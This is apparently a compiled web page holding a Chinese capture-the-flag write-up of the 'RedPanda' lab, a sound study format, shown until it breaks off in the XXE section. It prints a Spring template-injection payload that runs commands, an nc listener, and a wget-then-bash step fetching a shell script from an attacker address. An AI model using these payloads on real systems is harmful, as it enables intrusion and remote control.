import{_ as n,o as s,c as a,a as t}from"./app.92425ca1.js";var e="/img/in-post/2020-12-03/RedPanda.png",p="/img/in-post/2020-12-03/2022-12-02-19-06-15-image.png",o="/img/in-post/2020-12-03/2022-12-02-19-07-21-image.png",l="/img/in-post/2020-12-03/2022-12-02-19-04-41-image.png",c="/img/in-post/2020-12-03/2022-12-02-19-41-18-image.png",i="/img/in-post/2020-12-03/2022-12-02-19-14-17-image.png",u="/img/in-post/2020-12-03/2022-12-02-19-41-44-image.png",r="/img/in-post/2020-12-03/2022-12-02-20-03-30-image.png",d="/img/in-post/2020-12-03/2022-12-03-00-45-07-image.png";const k={},v=t('<h1 id="redpanda" tabindex="-1"><a class="header-anchor" href="#redpanda" aria-hidden="true">#</a> RedPanda</h1><p><img src="'+e+`" alt=""></p><h2 id="\u4FE1\u606F\u6536\u96C6" tabindex="-1"><a class="header-anchor" href="#\u4FE1\u606F\u6536\u96C6" aria-hidden="true">#</a> \u4FE1\u606F\u6536\u96C6</h2><h3 id="nmap" tabindex="-1"><a class="header-anchor" href="#nmap" aria-hidden="true">#</a> Nmap</h3><table><thead><tr><th>ip \u5730\u5740</th><th style="text-align:left;">10.129.227.207</th></tr></thead><tbody><tr><td>\u64CD\u4F5C\u7CFB\u7EDF</td><td style="text-align:left;">Linux/Ubuntu</td></tr><tr><td>HTTP \u670D\u52A1\u5668</td><td style="text-align:left;">8080</td></tr><tr><td>\u670D\u52A1\u7AEF\u6280\u672F\u6808</td><td style="text-align:left;">Sprint\xA0 Boot</td></tr></tbody></table><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>Starting Nmap <span class="token number">7.93</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2022</span>-12-02 <span class="token number">18</span>:43 CET
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.129</span>.227.207
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.051s latency<span class="token punctuation">)</span>.

PORT     STATE SERVICE    VERSION
<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>        OpenSSH <span class="token number">8</span>.2p1 Ubuntu 4ubuntu0.5 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey:
<span class="token operator">|</span>   <span class="token number">3072</span> 48add5b83a9fbcbef7e8201ef6bfdeae <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> b7896c0b20ed49b2c1867c2992741c1f <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> 18cd9d08a621a8b8b6f79f8d405154fb <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">8080</span>/tcp <span class="token function">open</span>  http-proxy
<span class="token operator">|</span>_http-title: Red Panda Search <span class="token operator">|</span> Made with Spring Boot
<span class="token operator">|</span> fingerprint-strings:
<span class="token operator">|</span>   GetRequest:
<span class="token operator">|</span>     HTTP/1.1 <span class="token number">200</span>
<span class="token operator">|</span>     Content-Type: text/html<span class="token punctuation">;</span><span class="token assign-left variable">charset</span><span class="token operator">=</span>UTF-8
<span class="token operator">|</span>     Content-Language: en-US
<span class="token operator">|</span>     Date: Fri, 02 Dec <span class="token number">2022</span> <span class="token number">17</span>:44:06 GMT
<span class="token operator">|</span>     Connection: close
<span class="token operator">|</span>     <span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>html <span class="token assign-left variable">lang</span><span class="token operator">=</span><span class="token string">&quot;en&quot;</span> <span class="token assign-left variable">dir</span><span class="token operator">=</span><span class="token string">&quot;ltr&quot;</span><span class="token operator">&gt;</span>
<span class="token operator">|</span>    <span class="token punctuation">..</span>.
<span class="token operator">|</span>    <span class="token operator">&lt;</span>/html<span class="token operator">&gt;</span>
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at
https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">38.81</span> seconds
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="\u76EE\u5F55\u7206\u7834" tabindex="-1"><a class="header-anchor" href="#\u76EE\u5F55\u7206\u7834" aria-hidden="true">#</a> \u76EE\u5F55\u7206\u7834</h3><p>\u901A\u8FC7\u5DE5\u5177,\u53CA\u4EBA\u5DE5\u5BA1\u67E5\u9875\u9762\u53EF\u4EE5\u5F97\u5230\u4EE5\u4E0B\u76EE\u5F55:</p><ul><li><p>search</p></li><li><p>error</p></li><li><p>stats</p></li><li><p>img</p></li></ul><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>\u250C\u2500\u2500<span class="token punctuation">(</span>xzy\u327Fxzy-Computer<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/tmp<span class="token punctuation">]</span>
\u2514\u2500$ feroxbuster <span class="token parameter variable">-u</span> <span class="token number">10.129</span>.227.207:8080
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">200</span>      GET       55l      119w    /
<span class="token number">405</span>      GET        1l        3w    /search
<span class="token number">500</span>      GET        1l        1w    /error
<span class="token number">200</span>      GET       32l       97w    /stats
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="\u56FE\u7247\u5BA1\u67E5" tabindex="-1"><a class="header-anchor" href="#\u56FE\u7247\u5BA1\u67E5" aria-hidden="true">#</a> \u56FE\u7247\u5BA1\u67E5</h3><p><code>Artist: woodenk</code> \u53EF\u80FD\u662F\u4E00\u4E2A\u7528\u6237\u540D.</p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>\u250C\u2500\u2500<span class="token punctuation">(</span>xzy\u327Fxzy-Computer<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
\u2514\u2500$ exiftool florida.jpg
ExifTool Version Number         <span class="token builtin class-name">:</span> <span class="token number">12.49</span>
File Name                       <span class="token builtin class-name">:</span> florida.jpg
Directory                       <span class="token builtin class-name">:</span> <span class="token builtin class-name">.</span>
File Size                       <span class="token builtin class-name">:</span> <span class="token number">111</span> kB
File Modification Date/Time     <span class="token builtin class-name">:</span> <span class="token number">2022</span>:12:02 <span class="token number">18</span>:56:30+01:00
File Access Date/Time           <span class="token builtin class-name">:</span> <span class="token number">2022</span>:12:02 <span class="token number">18</span>:56:30+01:00
File Inode Change Date/Time     <span class="token builtin class-name">:</span> <span class="token number">2022</span>:12:02 <span class="token number">18</span>:56:31+01:00
File Permissions                <span class="token builtin class-name">:</span> -rw-r--r--
<span class="token punctuation">..</span>.
Artist                          <span class="token builtin class-name">:</span> woodenk
<span class="token punctuation">..</span>.
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="\u7F51\u7AD9\u6574\u4F53\u5206\u6790" tabindex="-1"><a class="header-anchor" href="#\u7F51\u7AD9\u6574\u4F53\u5206\u6790" aria-hidden="true">#</a> \u7F51\u7AD9\u6574\u4F53\u5206\u6790</h3><p>\u7F51\u7AD9\u7684\u4E3B\u9875\u662F\u4E00\u4E2A\u641C\u7D22\u9875\u9762,\u7528\u6237\u8F93\u5165\u5185\u5BB9\u540E\u4F1A\u5F97\u5230\u4E00\u4E9B\u5173\u4E8E\u5C0F\u718A\u732B\u7684\u56FE\u7247.</p><p><img src="`+p+'" alt=""></p><p>\u641C\u7D22\u5185\u5BB9\u4F1A\u88AB\u56DE\u663E,\u5B58\u5728\u6CE8\u5165\u7684\u53EF\u80FD\u6027</p><p><img src="'+o+'" alt=""></p><p>\u7F51\u7AD9\u4F1A\u7EDF\u8BA1\u56FE\u7247\u88AB\u6D4F\u89C8\u7684\u6B21\u6570</p><p><img src="'+l+'" alt=""></p><p>\u6F5C\u5728\u7684\u7528\u6237\u540D:</p><ul><li><p>woodenk</p></li><li><p>damian</p></li></ul><h3 id="ssti-server-site-template-injection" tabindex="-1"><a class="header-anchor" href="#ssti-server-site-template-injection" aria-hidden="true">#</a> SSTI (Server Site Template Injection)</h3><p>\u901A\u8FC7\u5DF2\u77E5\u7684\u4FE1\u606F:</p><ol><li><p><strong>\u641C\u7D22\u6846</strong>\u53EF\u80FD\u5B58\u5728\u6CE8\u5165\u6F0F\u6D1E.</p></li><li><p>\u540E\u7AEF\u7528\u7684\u662F<strong>Sprint Boot</strong></p></li></ol><p><img src="'+c+'" alt=""></p><p>\u901A\u8FC7\u9A8C\u8BC1\u786E\u5B9E\u5B58\u5728\u6F0F\u6D1E. (\u6536\u96C6\u7684\u4FE1\u606F\u4E0D\u591A\u65F6, \u53EF\u4EE5\u8DD1\u4E00\u4E0B Fuzzing) <img src="'+i+`" alt=""></p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>*<span class="token punctuation">{</span>T<span class="token punctuation">(</span>org.apache.commons.io.IOUtils<span class="token punctuation">)</span>.toString<span class="token punctuation">(</span>T<span class="token punctuation">(</span>java.lang.Runtime<span class="token punctuation">)</span>.getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span>.exec<span class="token punctuation">(</span><span class="token string">&#39;$cmd&#39;</span><span class="token punctuation">)</span>.getInputStream<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>\u6210\u529F\u7684\u8FD4\u56DE\u4E86 ID \u547D\u4EE4\u7684\u7ED3\u679C</p><p><img src="`+u+`" alt=""> \u51C6\u5907\u53CD\u5C04 Shell, \u5F00\u59CB\u76D1\u542C\u7AEF\u53E3</p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>\u250C\u2500\u2500<span class="token punctuation">(</span>xzy\u327Fxzy-Computer<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
\u2514\u2500$ <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4444</span>
Ncat: Version <span class="token number">7.93</span> <span class="token punctuation">(</span> https://nmap.org/ncat <span class="token punctuation">)</span>
Ncat: Listening on :::4444
Ncat: Listening on <span class="token number">0.0</span>.0.0:4444
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u901A\u8FC7\u5728\u6A21\u677F\u4E2D\u63D2\u5165\u547D\u4EE4</p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code><span class="token function">wget</span> http://10.10.16.x:8080/shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code><span class="token function">bash</span> ./shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>\u6210\u529F\u83B7\u53D6\u5230 WebShell</p><p><img src="`+r+`" alt=""></p><p>\u5F97\u5230 User flag</p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>woodenk@redpanda:~$ <span class="token builtin class-name">pwd</span>
/home/woodenk
woodenk@redpanda:~$ <span class="token function">cat</span> user.txt
1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx3
woodenk@redpanda:~$
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="pe" tabindex="-1"><a class="header-anchor" href="#pe" aria-hidden="true">#</a> PE</h2><p>\u901A\u8FC7\u5BF9\u7F51\u7AD9\u7684\u603B\u4F53\u5206\u6790, \u53EF\u4EE5\u77E5\u9053\u5E94\u8BE5\u5B58\u5728\u4E00\u4E2A\u8BB0\u5F55\u7528\u6237\u8BBF\u95EE\u67D0\u4E2A\u56FE\u7247\u6B21\u6570\u7684\u7A0B\u5E8F, \u5B83\u5F88\u53EF\u80FD\u4F1A\u662F\u4E00\u4E2A\u7A81\u7834\u53E3.</p><p>\u67E5\u8BE2\u7F51\u7EDC\u76D1\u542C\u7AEF\u53E3, <code>8080</code> \u7AEF\u53E3\u8DD1\u7684\u662F\u4E00\u4E2A java \u7A0B\u5E8F, \u5B83\u7684\u8FDB\u7A0B ID \u662F <code>885</code></p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>woodenk@redpanda:/opt$ <span class="token function">netstat</span> <span class="token parameter variable">-nlp</span>
<span class="token function">netstat</span> <span class="token parameter variable">-nlp</span>
<span class="token punctuation">(</span>Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.<span class="token punctuation">)</span>
Active Internet connections <span class="token punctuation">(</span>only servers<span class="token punctuation">)</span>
Proto Recv-Q Send-Q Local Address        <span class="token punctuation">..</span>.      PID/Program name
tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.1:33060      <span class="token punctuation">..</span>.
tcp6       <span class="token number">0</span>      <span class="token number">0</span> :::8080              <span class="token punctuation">..</span>.      <span class="token number">885</span>/java
udp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:68           <span class="token punctuation">..</span>.
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>pwdx</code> \u5F97\u5230\u7A0B\u5E8F\u76EE\u5F55 <code>/tmp/hsperfdata_woodenk</code></p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>woodenk@redpanda:/opt$ pwdx <span class="token number">885</span>
<span class="token number">885</span>: /tmp/hsperfdata_woodenk
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>\u4F46\u662F\u8FD9\u4E2A\u6587\u4EF6\u5939\u4E0B\u6CA1\u4EC0\u4E48\u4E1C\u897F, \u6211\u4EEC\u4E0A\u4F20\u7684 shell \u5C31\u5B58\u5728\u8FD9\u4E2A\u76EE\u5F55.</p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>woodenk@redpanda:/tmp/hsperfdata_woodenk$ <span class="token function">ls</span>
<span class="token number">885</span> shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><code>lsof -p 885</code> \u83B7\u53D6\u66F4\u8BE6\u7EC6\u7684\u4FE1\u606F, \u5F97\u5230\u9879\u76EE\u8DEF\u5F84<code>/opt/panda_search</code></p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>woodenk@redpanda:/tmp/hsperfdata_woodenk$ <span class="token function">lsof</span> <span class="token parameter variable">-p</span> <span class="token number">885</span>
COMMAND PID    <span class="token environment constant">USER</span> <span class="token punctuation">..</span>. NODE NAME
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token function">java</span>    <span class="token number">885</span> woodenk <span class="token punctuation">..</span>.   <span class="token number">22806</span> /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
<span class="token function">java</span>    <span class="token number">885</span> woodenk <span class="token punctuation">..</span>.   <span class="token number">22806</span> /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u4F7F\u7528<code>ps -aux | grep panda_search</code> \u83B7\u53D6\u66F4\u591A\u7684\u4FE1\u606F, \u8FD9\u91CC\u53D1\u73B0\u8FDB\u7A0B\u662F\u4EE5 root \u8EAB\u4EFD\u8FD0\u884C.</p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>woodenk@redpanda:/tmp$ <span class="token function">ps</span> <span class="token parameter variable">-aux</span> <span class="token operator">|</span> <span class="token function">grep</span> panda_search
<span class="token function">ps</span> <span class="token parameter variable">-aux</span> <span class="token operator">|</span> <span class="token function">grep</span> panda_search
root         <span class="token number">866</span>  <span class="token punctuation">..</span>. /bin/sh <span class="token parameter variable">-c</span> <span class="token function">sudo</span> <span class="token parameter variable">-u</span> woodenk <span class="token parameter variable">-g</span> logs <span class="token function">java</span> <span class="token parameter variable">-jar</span> /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         <span class="token number">867</span>  <span class="token punctuation">..</span>. <span class="token function">sudo</span> <span class="token parameter variable">-u</span> woodenk <span class="token parameter variable">-g</span> logs <span class="token function">java</span> <span class="token parameter variable">-jar</span> /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
woodenk      <span class="token number">885</span>  <span class="token punctuation">..</span>. <span class="token function">java</span> <span class="token parameter variable">-jar</span> /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u538B\u7F29\u9879\u76EE,\u4F20\u56DE\u672C\u5730</p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>woodenk@redpanda:/opt$ <span class="token function">tar</span> <span class="token parameter variable">-cf</span> /tmp/source.tar panda_search
<span class="token function">tar</span> <span class="token parameter variable">-cf</span> /tmp/source.tar panda_search
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>\u4F7F\u7528 python \u8FD0\u884C\u4E00\u4E2A HTTP \u670D\u52A1</p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>woodenk@redpanda:/tmp$ python3 <span class="token parameter variable">-m</span> http.server <span class="token number">4444</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>\u250C\u2500\u2500<span class="token punctuation">(</span>xzy\u327Fxzy-Computer<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/tmp<span class="token punctuation">]</span>
\u2514\u2500$ <span class="token function">wget</span> http://10.129.227.207:8999/source.tar
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="xxe" tabindex="-1"><a class="header-anchor" href="#xxe" aria-hidden="true">#</a> XXE</h3><p>\u901A\u8FC7\u5206\u6790\u6E90\u7801 /stats \u8FD9\u4E2A\u63A5\u53E3\u4F1A\u6839\u636E\u4E00\u4E2A xml \u6587\u4EF6\u6E32\u67D3 html \u9875\u9762</p><div class="language-java ext-java line-numbers-mode"><pre class="language-java"><code><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">&quot;/stats&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">ModelAndView</span> <span class="token function">stats</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">&quot;author&quot;</span><span class="token punctuation">,</span> required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token class-name">String</span> author<span class="token punctuation">,</span> <span class="token class-name">Model</span> model<span class="token punctuation">)</span>
        <span class="token keyword">throws</span> <span class="token class-name">JDOMException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>author<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">&quot;woodenk&quot;</span><span class="token punctuation">)</span> <span class="token operator">||</span> author<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">&quot;damian&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> path <span class="token operator">=</span> <span class="token string">&quot;/credits/&quot;</span> <span class="token operator">+</span> author <span class="token operator">+</span> <span class="token string">&quot;_creds.xml&quot;</span><span class="token punctuation">;</span>
        <span class="token class-name">File</span> fd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Document</span> doc <span class="token operator">=</span> saxBuilder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ModelAndView</span><span class="token punctuation">(</span><span class="token string">&quot;stats.html&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">&quot;noAuthor&quot;</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ModelAndView</span><span class="token punctuation">(</span><span class="token string">&quot;stats.html&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+d+`" alt=""></p><div class="language-xml ext-xml line-numbers-mode"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>credits</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">&gt;</span></span>damian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>uri</span><span class="token punctuation">&gt;</span></span>/img/angy.jpg<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>uri</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>views</span><span class="token punctuation">&gt;</span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>views</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>uri</span><span class="token punctuation">&gt;</span></span>/img/shy.jpg<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>uri</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>views</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>views</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>uri</span><span class="token punctuation">&gt;</span></span>/img/crafty.jpg<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>uri</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>views</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>views</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>uri</span><span class="token punctuation">&gt;</span></span>/img/peter.jpg<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>uri</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>views</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>views</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>totalviews</span><span class="token punctuation">&gt;</span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>totalviews</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>credits</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u901A\u8FC7\u89C2\u5BDF\u6587\u4EF6\u5939\u6CA1\u6709\u5199\u5165\u6743\u9650, \u52A0\u4E0A\u5199\u6B7B\u7684\u903B\u8F91\u6CA1\u4EC0\u4E48\u7A81\u7834\u53E3</p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>woodenk@redpanda:/credits$ <span class="token function">ls</span> <span class="token parameter variable">-la</span>
total <span class="token number">16</span>
drw-r-x---  <span class="token number">2</span> root logs <span class="token number">4096</span> Jun <span class="token number">21</span> <span class="token number">12</span>:32 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">20</span> root root <span class="token number">4096</span> Jun <span class="token number">23</span> <span class="token number">14</span>:52 <span class="token punctuation">..</span>
-rw-r-----  <span class="token number">1</span> root logs  <span class="token number">422</span> Dec  <span class="token number">2</span> <span class="token number">18</span>:54 damian_creds.xml
-rw-r-----  <span class="token number">1</span> root logs  <span class="token number">426</span> Dec  <span class="token number">2</span> <span class="token number">18</span>:54 woodenk_creds.xml
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u5728<code>/opt</code>\u76EE\u5F55\u4E0B\u5B58\u5728\u53E6\u4E00\u4E2A\u9879\u76EE <code>credit-score</code></p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>woodenk@redpanda:/opt$ <span class="token function">ls</span>
cleanup.sh
credit-score
maven
panda_search
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u89C2\u5BDF\u6E90\u4EE3\u7801\u770B\u8D77\u6765\u662F\u4E00\u4E2A\u901A\u8FC7\u65E5\u5FD7\u7EDF\u8BA1\u56FE\u7247\u8BBF\u95EE\u6B21\u6570\u7684\u7A0B\u5E8F, \u901A\u8FC7\u5B9A\u65F6\u4EFB\u52A1\u88AB\u6267\u884C</p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>woodenk@redpanda:/opt/panda_search$ <span class="token function">cat</span> redpanda.log

<span class="token number">304</span><span class="token operator">||</span><span class="token number">10.10</span>.16.2<span class="token operator">||</span>Mozilla <span class="token punctuation">..</span>.<span class="token operator">||</span>/img/angy.jpg
